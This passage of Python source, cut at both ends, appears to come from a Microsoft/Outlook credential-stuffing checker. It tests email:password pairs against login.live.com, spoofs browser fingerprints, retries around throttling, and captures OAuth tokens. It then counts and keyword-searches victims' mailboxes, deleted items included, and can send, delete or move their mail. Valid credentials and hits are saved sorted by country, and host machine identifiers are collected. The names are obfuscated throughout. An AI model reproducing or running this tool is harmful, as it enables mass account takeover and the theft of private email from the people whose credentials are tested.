    if not msg_id or not isinstance(msg_id, str):
        return '<p>(Invalid message ID)</p>'
    shapes = [{'__type': 'ItemResponseShape:#Exchange', 'BaseShape': 'Default'}, {'__type': 'ItemResponseShape:#Exchange', 'BaseShape': 'AllProperties'}, {'__type': 'ItemResponseShape:#Exchange', 'BaseShape': 'Default', 'BodyType': 'HTML', 'UniqueBodyType': 'HTML', 'FilterHtmlContent': True, 'MaximumBodySize': 2097152}, {'__type': 'ItemResponseShape:#Exchange', 'BaseShape': 'IdOnly', 'IncludeMimeContent': True}]
    body_text = ''
    for pos, shape in enumerate(shapes):
        payload = {'__type': 'GetItemJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'GetItemRequest:#Exchange', 'ItemShape': shape, 'ItemIds': [{'__type': 'ItemId:#Exchange', 'Id': msg_id}]}}
        try:
            resp = owa_request(email, token, cid, 'GetItem', payload, proxy, 20)
            if resp.status_code != 200:
                body_text = f'HTTP {resp.status_code}'
                continue
            try:
                data = resp.json()
            except Exception:
                body_text = 'Bad JSON response'
                continue
            folder_items = data.get('Body', {}).get('ResponseMessages', {}).get('Items', [])
            if not folder_items:
                body_text = 'No response messages'
                continue
            folder_item = folder_items[0] if isinstance(folder_items[0], dict) else {}
            if folder_item.get('ResponseClass') != 'Success':
                body_text = folder_item.get('MessageText', 'Unknown error')[:80]
                continue
            items = folder_item.get('Items') or []
            if not items:
                body_text = 'No items in response'
                continue
            msg = items[0] if isinstance(items[0], dict) else {}
            for body_key in ['Body', 'UniqueBody', 'NormalizedBody']:
                body_obj = msg.get(body_key, {})
                if isinstance(body_obj, dict) and body_obj.get('Value'):
                    return body_obj['Value']
            if pos == 3:
                mime_b64 = msg.get('MimeContent', {}).get('Value', '')
                if mime_b64:
                    try:
                        email_lib = __import__('email')
                        _b64 = __import__('base64')
                        mime_bytes = _b64.b64decode(mime_b64)
                        mime_msg = email_lib.message_from_bytes(mime_bytes)
                        part_text = ''
                        part_html = ''
                        if mime_msg.is_multipart():
                            for part in mime_msg.walk():
                                part_type = part.get_content_type()
                                proxy3 = part.get_payload(decode=True)
                                if proxy3 is None:
                                    continue
                                part_decoded = proxy3.decode(errors='replace')
                                if part_type == 'text/html' and (not part_text):
                                    part_text = part_decoded
                                elif part_type == 'text/plain' and (not part_html):
                                    part_html = part_decoded
                        else:
                            proxy3 = mime_msg.get_payload(decode=True)
                            if proxy3:
                                part_decoded = proxy3.decode(errors='replace')
                                if mime_msg.get_content_type() == 'text/html':
                                    part_text = part_decoded
                                else:
                                    part_html = part_decoded
                        return part_text or f'<pre>{part_html}</pre>'
                    except Exception as exc2:
                        body_text = f'MIME parse: {str(exc2)[:40]}'
                        continue
                else:
                    body_text = 'No MIME content'
        except Exception as exc2:
            body_text = str(exc2)[:60]
            continue
    return f'<p>(Could not fetch email body: {body_text}. Try refreshing.)</p>'

def create_item(email, token, cid, to_email, subject, body, proxy=None):
    pass
    recipients = []
    for rcpt in to_email:
        if isinstance(rcpt, dict):
            rcpt = rcpt.get('Address', '')
        if rcpt:
            recipients.append({'__type': 'EmailAddress:#Exchange', 'Address': rcpt})
    if not recipients:
        return (False, 'No valid recipients')
    payload = {'__type': 'CreateItemJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'CreateItemRequest:#Exchange', 'MessageDisposition': 'SendAndSaveCopy', 'Items': [{'__type': 'Message:#Exchange', 'Subject': subject, 'Body': {'__type': 'BodyContentType:#Exchange', 'BodyType': 'HTML', 'Value': body}, 'ToRecipients': recipients}]}}
    try:
        resp = owa_request(email, token, cid, 'CreateItem', payload, proxy, 20)
        if resp.status_code == 200:
            data = resp.json()
            resp_class = data.get('Body', {}).get('ResponseMessages', {}).get('Items', [{}])[0].get('ResponseClass', '')
            return (resp_class == 'Success', resp_class)
        return (False, f'HTTP {resp.status_code}')
    except Exception as exc:
        return (False, str(exc)[:50])

def delete_item(email, msg_id, token, cid, proxy=None, change_key=''):
    pass
    item_id_obj = {'__type': 'ItemId:#Exchange', 'Id': msg_id}
    if change_key:
        item_id_obj['ChangeKey'] = change_key
    payload = {'__type': 'DeleteItemJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'DeleteItemRequest:#Exchange', 'ItemIds': [item_id_obj], 'DeleteType': 'MoveToDeletedItems'}}
    try:
        resp = owa_request(email, token, cid, 'DeleteItem', payload, proxy, 15)
        if resp.status_code == 200:
            data = resp.json()
            resp_class = data.get('Body', {}).get('ResponseMessages', {}).get('Items', [{}])[0].get('ResponseClass', '')
            return (resp_class == 'Success', resp_class)
        return (False, f'HTTP {resp.status_code}')
    except Exception as exc:
        return (False, str(exc)[:50])

def move_item(email, msg_id, token, cid, to_folder='deleteditems', proxy=None, change_key=''):
    pass
    item_id_obj = {'__type': 'ItemId:#Exchange', 'Id': msg_id}
    if change_key:
        item_id_obj['ChangeKey'] = change_key
    payload = {'__type': 'MoveItemJsonRequest:#Exchange', 'Header': make_session(), 'Body': {'__type': 'MoveItemRequest:#Exchange', 'ItemIds': [item_id_obj], 'ToFolderId': {'__type': 'DistinguishedFolderId:#Exchange', 'Id': to_folder}}}
    try:
        resp = owa_request(email, token, cid, 'MoveItem', payload, proxy, 15)
        if resp.status_code == 200:
            data = resp.json()
            resp_class = data.get('Body', {}).get('ResponseMessages', {}).get('Items', [{}])[0].get('ResponseClass', '')
            return (resp_class == 'Success', resp_class)
        return (False, f'HTTP {resp.status_code}')
    except Exception as exc:
        return (False, str(exc)[:50])

def load_settings():
    _r = __import__('random')
    _b64 = __import__('base64')
    _hl = __import__('hashlib')
    ua = _r.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'])
    platform = _r.choice(['Windows', 'macOS', 'Linux'])
    platform_ver = _r.choice(['10.0', '11.0', '12.0', '13.0', '14.0'])
    screen_w = _r.choice([1920, 1366, 1536, 1440])
    screen_h = _r.choice([1080, 768, 864, 900])
    color_depth = _r.choice([24, 30, 32])
    hw_conc = _r.choice([4, 6, 8, 10, 12])
    touch = _r.choice([0, 1, 5, 10])
    fp_id = str(uuid.uuid4())
    js_result = {'fingerprint': {'userAgent': ua, 'platform': platform}, 'executionTime': _r.uniform(0.001, 0.005), 'jsHeapUsed': _r.randint(1000000, 10000000), 'callbackCount': _r.randint(0, 5), 'eventLoopDelay': _r.uniform(0.5, 2.0), 'domElements': _r.randint(100, 500), 'scriptsLoaded': _r.randint(10, 50), 'networkRequests': _r.randint(5, 20), 'renderingTime': _r.uniform(10, 50)}
    browser_data = _b64.b64encode(json.dumps({'screenWidth': screen_w, 'screenHeight': screen_h, 'colorDepth': color_depth, 'hardwareConcurrency': hw_conc, 'maxTouchPoints': touch}).encode()).decode()
    return {'ua': ua, 'platform': platform, 'platform_ver': platform_ver, 'fp_id': fp_id, 'js_result': json.dumps(js_result), 'browser_data': browser_data, 'sec_ch_ua': '"Chromium";v="120", "Not;A=Brand";v="99"'}

def check_account(email, pw, search_q=None, smtp_enabled=False, proxy_url=None):
    pass
    importlib = __import__('importlib')
    _up = importlib.import_module('urllib.parse')
    email = email.strip().lower()
    cid2 = email.split('@')[-1] if '@' in email else '?'
    keywords = []
    if search_q:
        keywords = [kw.strip() for kw in search_q.replace(',', '\n').splitlines() if kw.strip()]
    max_threads = 5
    for attempt in range(max_threads):
        session = requests.Session()
        if proxy_url:
            session.proxies = {'http': proxy_url, 'https': proxy_url}
        try:
            ua = load_settings()
            auth_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en', headers={'User-Agent': ua['ua'], 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'X-Fingerprint-Id': ua['fp_id'], 'X-Browser-Data': ua['browser_data'], 'sec-ch-ua': ua['sec_ch_ua'], 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': f'''"{ua['platform']}"''', 'sec-ch-ua-platform-version': f'''"{ua['platform_ver']}"'''}, timeout=10)
            if auth_resp.status_code != 200:
                if attempt < max_threads - 1:
                    time.sleep(0.2)
                    continue
                return build_result(email, pw, cid2, 'error', f'connect failed ({auth_resp.status_code})', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
            ppft_m = re.search('value=\\\\"(.+?)\\\\"', auth_resp.text)
            if not ppft_m:
                if attempt < max_threads - 1:
                    time.sleep(0.2)
                    continue
                return build_result(email, pw, cid2, 'error', 'no PPFT (Microsoft changed format)', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
            ppft = ppft_m.group(1)
            urlpost_m = re.search('\\"urlPost\\":\\"([^\\"]+)\\"', auth_resp.text)
            if not urlpost_m:
                urlpost_m = re.search('"urlPost":"([^"]+)"', auth_resp.text)
            if not urlpost_m:
                if attempt < max_threads - 1:
                    time.sleep(0.2)
                    continue
                return build_result(email, pw, cid2, 'error', 'no urlPost', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
            urlpost = urlpost_m.group(1)
            post_resp = session.post(urlpost, data={'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 'passwd': pw, 'ps': '2', 'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1', 'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'}, headers={'User-Agent': ua['ua'], 'Origin': 'https://login.live.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': auth_resp.url, 'X-Fingerprint-Id': ua['fp_id'], 'X-JS-Execution': ua['js_result'], 'X-Browser-Data': ua['browser_data'], 'sec-ch-ua': ua['sec_ch_ua'], 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': f'''"{ua['platform']}"''', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1'}, allow_redirects=False, timeout=10)
            loc1 = post_resp.headers.get('Location', '')
            if 'access_token=' not in loc1:
                post_text = post_resp.text.lower() if post_resp.text else ''
                pplstate = session.cookies.get('PPLState') or ''
                if pplstate == '1':
                    pass
                elif any((err_kw in post_text for err_kw in ('too many', 'rate limit', 'temporarily', 'try again', 'locked', 'throttled', 'unusual activity', 'help us protect', 'abus'))):
                    if attempt < max_threads - 1:
                        time.sleep(0.5 + attempt * 0.35)
                        continue
                    return build_result(email, pw, cid2, 'error', 'throttled by Microsoft', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
                elif 'incorrect' in post_text or 'doesn' in post_text:
                    if attempt < max_threads - 1:
                        time.sleep(0.35 + attempt * 0.25)
                        continue
                    return build_result(email, pw, cid2, 'bad', 'invalid credentials', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
                elif 'passkey' in post_text or 'sign in another way' in post_text:
                    return build_result(email, pw, cid2, 'error', 'passkey/2FA required', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
                elif attempt < max_threads - 1:
                    time.sleep(0.2)
                    continue
                else:
                    return build_result(email, pw, cid2, 'error', 'no token in response', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
            cid = post_resp.cookies.get('MSPCID', uuid.uuid4().hex[:16]).upper()
            ms_token = None
            try:
                auth2_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=' + _up.quote('https://substrate.office.com/User-Internal.ReadWrite') + '&response_type=token&prompt=none', headers={'User-Agent': ua['ua']}, allow_redirects=False, timeout=10)
                loc2 = auth2_resp.headers.get('Location', '')
                if 'access_token=' in loc2:
                    ms_token = loc2.split('access_token=')[1].split('&')[0]
                    ms_token = _up.unquote(ms_token)
            except Exception:
                pass
            if not ms_token:
                try:
                    auth3_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::outlook.office.com::MBI_SSL&response_type=token&prompt=none', headers={'User-Agent': ua['ua']}, allow_redirects=False, timeout=10)
                    loc3 = auth3_resp.headers.get('Location', '')
                    if 'access_token=' in loc3:
                        ms_token = loc3.split('access_token=')[1].split('&')[0]
                        ms_token = _up.unquote(ms_token)
                except Exception:
                    pass
            if not ms_token:
                try:
                    auth4_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=' + _up.quote('https://substrate.office.com/User-Internal.ReadWrite') + '&display=touch&response_type=token&locale=en', headers={'User-Agent': ua['ua']}, timeout=10)
                    if 'access_token=' in auth4_resp.url:
                        ms_token = auth4_resp.url.split('access_token=')[1].split('&')[0]
                        ms_token = _up.unquote(ms_token)
                except Exception:
                    pass
            if not ms_token and pplstate == '1':
                try:
                    auth5_resp = session.get('https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=' + _up.quote('https://substrate.office.com/User-Internal.ReadWrite') + '&display=touch&response_type=token&locale=en', headers={'User-Agent': ua['ua']}, timeout=10)
                    ppft2 = None
                    ppft_m2 = re.search('value=\\\\"(.+?)\\\\"', auth5_resp.text)
                    if ppft_m2:
                        ppft2 = ppft_m2.group(1)
                    else:
                        sfttag_m = re.search('"sFTTag":"([^"]+)"', auth5_resp.text)
                        if sfttag_m:
                            sfttag = sfttag_m.group(1).replace('\\"', '"')
                            ppft_m3 = re.search('value="([^"]+)"', sfttag)
                            if ppft_m3:
                                ppft2 = ppft_m3.group(1)
                    urlpost2 = None
                    urlpost_m2 = re.search('"urlPost":"([^"]+)"', auth5_resp.text)
                    if urlpost_m2:
                        urlpost2 = urlpost_m2.group(1)
                    if ppft2 and urlpost2:
                        post2_resp = session.post(urlpost2, data={'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 'passwd': pw, 'ps': '2', 'PPFT': ppft2, 'PPSX': 'PassportR', 'NewUser': '1', 'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'}, headers={'User-Agent': ua['ua'], 'Origin': 'https://login.live.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': auth5_resp.url}, allow_redirects=False, timeout=10)
                        loc4 = post2_resp.headers.get('Location', '')
                        if 'access_token=' in loc4:
                            ms_token = loc4.split('access_token=')[1].split('&')[0]
                            ms_token = _up.unquote(ms_token)
                        elif post2_resp.status_code == 200 and 'DoSubmit' in post2_resp.text:
                            action_m = re.search('action="([^"]+)"', post2_resp.text)
                            if action_m:
                                action_url = action_m.group(1).replace('&amp;', '&')
                                form_data = {}
                                for input_m in re.finditer('<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"', post2_resp.text):
                                    form_data[input_m.group(1)] = input_m.group(2)
                                post3_resp = session.post(action_url, data=form_data, headers={'User-Agent': ua['ua'], 'Origin': 'https://login.live.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': post2_resp.url}, allow_redirects=True, timeout=10)
                                if 'access_token=' in post3_resp.url:
                                    ms_token = post3_resp.url.split('access_token=')[1].split('&')[0]
                                    ms_token = _up.unquote(ms_token)
                except Exception:
                    pass
            location = 'Unknown'
            if ms_token:
                try:
                    profile_resp = session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers={'Authorization': f'Bearer {ms_token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}, timeout=10)
                    if profile_resp.status_code == 200:
                        location = profile_resp.json().get('accounts', [{}])[0].get('location', 'Unknown')
                except Exception:
                    pass
            inbox_count = 0
            if ms_token:
                try:
                    startup_resp = session.post(f'https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0', headers={'authorization': f'Bearer {ms_token}', 'x-owa-sessionid': str(uuid.uuid4()), 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}, data='', timeout=10)
                    if startup_resp.status_code == 200:
                        total_m = re.search('"TotalCount":(\\d+)', startup_resp.text)
                        inbox_count = int(total_m.group(1)) if total_m else 0
                except Exception:
                    pass
                if inbox_count == 0:
                    try:
                        search_id = str(uuid.uuid4())
                        search_resp = session.post('https://substrate.office.com/search/api/v2/query', headers={'Authorization': f'Bearer {ms_token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}, json={'Cvid': search_id, 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]}, 'From': 0, 'Query': {'QueryString': '*'}, 'Size': 1, 'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]}], 'LogicalId': search_id}, timeout=10)
                        if search_resp.status_code == 200:
                            inbox_count = search_resp.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                    except Exception:
                        pass
            kw_details = {}
            kw_match = 0
            if keywords and ms_token:
                importlib = __import__('importlib')
                _cf = importlib.import_module('concurrent.futures')
                kw_results = {}
                kw_lock = _threading.Lock()
                search_headers = {'Authorization': f'Bearer {ms_token}', 'X-AnchorMailbox': f'CID:{cid}'}

                def search_kw(kw2):
                    query = f'from:{kw2}' if '@' in kw2 else kw2
                    search_id = str(uuid.uuid4())
                    payload = {'Cvid': search_id, 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': query}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': search_id}
                    try:
                        search_resp = session.post('https://substrate.office.com/search/api/v2/query', headers={**search_headers, 'Accept': 'application/json', 'User-Agent': 'Outlook-Android/2.0', 'X-Routing-Hint': f'CID:{cid}'}, json=payload, timeout=10)
                        if search_resp.status_code == 200:
                            total_count = 0
                            try:
                                total_count = search_resp.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                            except Exception:
                                pass
                            if total_count > 0:
                                subject = 'N/A'
                                for subj_pat in ['"Subject":"', '"Topic":"', '"Preview":"']:
                                    subj_m = re.search(subj_pat + '([^"]+)', search_resp.text)
                                    if subj_m and subj_m.group(1):
                                        subject = subj_m.group(1)[:100]
                                        break
                                date_str = 'N/A'
                                for date_pat in ['"DateTimeReceived":"', '"ReceivedDateTime":"', '"DateTimeSent":"', '"SentDateTime":"', '"DateTimeCreated":"', '"LastModifiedTime":"', '"ConversationLastDeliveredTime":"', '"LastDeliveredDateTime":"', '"Time":"', '"SortTime":"', '"LastDeliveryTime":"']:
                                    date_m = re.search(date_pat + '([^"]+)', search_resp.text)
                                    if date_m and date_m.group(1):
                                        date_raw = date_m.group(1)
                                        date_clean = re.search('(\\d{4}-\\d{2}-\\d{2})', date_raw)
                                        if date_clean:
                                            date_str = date_clean.group(1)
                                        else:
                                            date_str = date_raw[:10]
                                        break
                                with kw_lock:
                                    kw_results[kw2] = {'count': total_count, 'subject': subject, 'date': date_str}
                                return True
                    except Exception:
                        pass
                    return False
                with _cf.ThreadPoolExecutor(max_workers=min(len(keywords), 6)) as pool:
                    futures = {pool.submit(search_kw, kw2): kw2 for kw2 in keywords}
                    for fut in _cf.as_completed(futures):
                        fut.result()
                for kw2, info in kw_results.items():
                    kw_details[kw2] = [{'subject': info['subject'], 'date': info['date'], 'count': info['count']}]
                kw_match = 1 if kw_details else 0
            kw_details = {}
            kw_match = 0
            if ms_token:
                keywords = []
                if search_q:
                    keywords = [kw.strip() for kw in search_q.replace(',', '\n').splitlines() if kw.strip()]
                if keywords:
                    importlib = __import__('importlib')
                    _cf = importlib.import_module('concurrent.futures')
                    kw_results = {}
                    kw_lock = _threading.Lock()
                    search_headers = {'Authorization': f'Bearer {ms_token}', 'X-AnchorMailbox': f'CID:{cid}'}

                    def search_kw(kw2):
                        query = f'from:{kw2}' if '@' in kw2 else kw2
                        search_id = str(uuid.uuid4())
                        payload = {'Cvid': search_id, 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'UTC', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': query}, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'LogicalId': search_id}
                        try:
                            search_resp = session.post('https://substrate.office.com/search/api/v2/query', headers={**search_headers, 'Accept': 'application/json', 'User-Agent': 'Outlook-Android/2.0', 'X-Routing-Hint': f'CID:{cid}'}, json=payload, timeout=10)
                            if search_resp.status_code == 200:
                                total_count = 0
                                try:
                                    total_count = search_resp.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                                except Exception:
                                    pass
                                if total_count > 0:
                                    subject = 'N/A'
                                    for subj_pat in ['"Subject":"', '"Topic":"', '"Preview":"']:
                                        subj_m = re.search(subj_pat + '([^"]+)', search_resp.text)
                                        if subj_m and subj_m.group(1):
                                            subject = subj_m.group(1)[:100]
                                            break
                                    date_str = 'N/A'
                                    for date_pat in ['"DateTimeReceived":"', '"ReceivedDateTime":"', '"DateTimeSent":"', '"SentDateTime":"', '"DateTimeCreated":"', '"LastModifiedTime":"', '"ConversationLastDeliveredTime":"', '"LastDeliveredDateTime":"', '"Time":"', '"SortTime":"', '"LastDeliveryTime":"']:
                                        date_m = re.search(date_pat + '([^"]+)', search_resp.text)
                                        if date_m and date_m.group(1):
                                            date_raw = date_m.group(1)
                                            date_clean = re.search('(\\d{4}-\\d{2}-\\d{2})', date_raw)
                                            if date_clean:
                                                date_str = date_clean.group(1)
                                            else:
                                                date_str = date_raw[:10]
                                            break
                                    with kw_lock:
                                        kw_results[kw2] = {'count': total_count, 'subject': subject, 'date': date_str}
                                    return True
                        except Exception:
                            pass
                        return False
                    with _cf.ThreadPoolExecutor(max_workers=min(len(keywords), 6)) as pool:
                        futures = {pool.submit(search_kw, kw2): kw2 for kw2 in keywords}
                        for fut in _cf.as_completed(futures):
                            fut.result()
                    for kw2, info in kw_results.items():
                        kw_details[kw2] = [{'subject': info['subject'], 'date': info['date'], 'count': info['count']}]
                    kw_match = 1 if kw_details else 0
            if not ms_token and inbox_count == 0 and (not kw_details):
                return build_result(email, pw, cid2, 'error', 'flagged by Microsoft (no mail access)', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
            return build_result(email, pw, cid2, 'valid', 'ok', 'oauth', info={'inbox': inbox_count, 'total': inbox_count, 'kw_match': kw_match, 'kw_details': kw_details, 'location': location, 'token': ms_token or '', 'cid': cid})
        except requests.Timeout:
            if attempt < max_threads - 1:
                time.sleep(0.2)
                continue
            return build_result(email, pw, cid2, 'error', 'timeout', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
        except requests.ConnectionError as exc2:
            if attempt < max_threads - 1:
                time.sleep(0.2)
                continue
            return build_result(email, pw, cid2, 'error', f'connection: {str(exc2)[:40]}', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
        except Exception as exc:
            if attempt < max_threads - 1:
                time.sleep(0.2)
                continue
            return build_result(email, pw, cid2, 'error', str(exc)[:60], 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})
    return build_result(email, pw, cid2, 'error', 'OAuth flow failed after retries', 'oauth', info={'inbox': 0, 'total': 0, 'kw_match': 0, 'kw_details': {}})

def build_result(email, pw, cid2, status, message, method, is_hit=False, is_2fa=False, info=None, extra=None, extra2='', extra3=993, sh='', extra4=587):
    return {'email': email.strip(), 'pw': pw.strip(), 'domain': cid2, 'status': status, 'reason': message, 'via': method or '?', 'imap_ok': is_hit, 'smtp_ok': is_2fa, 'info': info or {}, 'msgs': extra or [], 'ih': extra2, 'ip': extra3, 'sh': sh, 'sp': extra4}

def save(resp):
    load_combos()
    startup_resp = resp['status']
    info = resp.get('info', {})
    line = f"{resp['email']}:{resp['pw']}\n"
    total = info.get('total', 0)
    inbox_n = info.get('inbox', 0)
    kw_details = info.get('kw_details', {})
    location = info.get('location', 'Unknown')
    with open(results_path / 'all.txt', 'a', encoding='utf-8') as folder:
        folder.write(line)
    if startup_resp == 'valid':
        with open(results_path / 'valid' / 'valid.txt', 'a', encoding='utf-8') as folder:
            folder.write(line)
        domain_safe = re.sub('[^\\w.]', '_', resp.get('domain', 'x'))[:48]
        with open(results_path / 'valid' / f'{domain_safe}.txt', 'a', encoding='utf-8') as folder:
            folder.write(line)
        if location and location != 'Unknown':
            region_code = location.strip().upper()[:3]
            region_safe = re.sub('[^\\w.]', '_', location)[:30]
        else:
            region_safe = 'Unknown'
        valid_dir = results_path / 'valid' / region_safe
        valid_dir.mkdir(parents=True, exist_ok=True)
        with open(valid_dir / f'{region_safe}.txt', 'a', encoding='utf-8') as folder:
            folder.write(line)
        if kw_details:
            hits_dir = results_path / 'hits'
            hits_dir.mkdir(parents=True, exist_ok=True)
            for kw2, kw_info in kw_details.items():
                kw_safe = re.sub('[^\\w.]', '_', kw2.strip())[:48]
                subject = kw_info[0].get('subject', 'N/A') if kw_info else 'N/A'
                kw_date = kw_info[0].get('date', 'N/A') if kw_info else 'N/A'
                kw_count = kw_info[0].get('count', len(kw_info)) if kw_info else 0
                proxy4 = f"{resp['email']}:{resp['pw']} | Matches:{kw_count} | Total:{total} | Country:{location} | Date:{kw_date} | Subject:{subject[:80]}\n"
                with open(hits_dir / f'{kw_safe}.txt', 'a', encoding='utf-8') as folder:
                    folder.write(proxy4)
    elif startup_resp == 'bad':
        with open(results_path / 'invalid' / 'invalid.txt', 'a', encoding='utf-8') as folder:
            folder.write(line)
    elif startup_resp == 'access_denied':
        with open(results_path / 'valid' / 'access_denied.txt', 'a', encoding='utf-8') as folder:
            folder.write(line)

def load_ui_settings():
    pass
    sysinfo = {}
    try:
        if sys.platform == 'win32':
            winreg = __import__('winreg')
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\Microsoft\\\\Cryptography') as key:
                    reg_val, reg_type = winreg.QueryValueEx(key, 'MachineGuid')
                    sysinfo['machine_guid'] = str(reg_val).lower().strip()
            except Exception:
                pass
    except Exception:
        pass
    try:
        for machine_id_path in ['/etc/machine-id', '/var/lib/dbus/machine-id']:
            try:
                proxy = Path(machine_id_path)
                if proxy.exists():
                    machine_id = proxy.read_text().strip()
                    if machine_id:
                        sysinfo['machine_id'] = machine_id.lower()
                        break
            except Exception:
                pass
    except Exception:
        pass
    try:
        if sys.platform == 'darwin':
            subprocess = __import__('subprocess')
            try:
                result = subprocess.run(['ioreg', '-rd1', '-c', 'IOPlatformExpertDevice'], capture_output=True, text=True, timeout=5)
                for proxy4 in result.stdout.split('\n'):
                    if 'IOPlatformUUID' in proxy4:
                        uuid = proxy4.split('"')[-2] if '"' in proxy4 else ''
                        if uuid:
                            sysinfo['platform_uuid'] = uuid.lower().strip()
                            break
            except Exception:
                pass
    except Exception:
        pass
    try:
        sysinfo['cpu'] = _platform.processor().lower().strip()
    except Exception:
        pass
    try:
        sysinfo['arch'] = _platform.machine().lower().strip()
    except Exception:
        pass
    try:
        if sys.platform.startswith('linux'):
            subprocess = __import__('subprocess')
            try:
                result = subprocess.run(['lsblk', '-n', '-o', 'UUID', '-d'], capture_output=True, text=True, timeout=5)
                lines_out = [ln.strip() for ln in result.stdout.split('\n') if ln.strip()]
                if lines_out:
                    sysinfo['disk_uuid'] = lines_out[0].lower()
            except Exception:
                pass
        elif sys.platform == 'win32':
            subprocess = __import__('subprocess')
            try:
                result = subprocess.run(['vol', 'C:'], capture_output=True, text=True, timeout=5)
                for proxy4 in result.stdout.split('\n'):
                    if 'Serial Number' in proxy4 or 'Volume Serial' in proxy4:
                        parts = proxy4.split(':')
                        if len(parts) >= 2:
                            sysinfo['disk_serial'] = parts[-1].strip().lower()
                            break
            except Exception:
                pass
    except Exception:
        pass
    try:
        if sys.platform.startswith('linux'):
